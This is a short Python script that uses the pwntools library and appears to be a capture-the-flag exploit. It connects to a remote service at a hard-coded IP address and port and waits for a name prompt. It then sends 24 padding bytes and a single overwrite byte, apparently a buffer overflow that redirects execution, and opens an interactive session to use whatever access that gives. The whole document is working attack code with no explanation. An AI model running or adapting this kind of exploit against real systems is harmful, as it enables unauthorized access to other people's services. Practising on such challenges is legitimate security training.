from pwn import *

r = remote('34.123.210.162', 20234)
context(arch='amd64', os='linux', log_level='debug')
r.recvuntil(b"Hello! What's your name?: ")
r.sendline(b'A'*24+b'\xcb')
r.interactive()
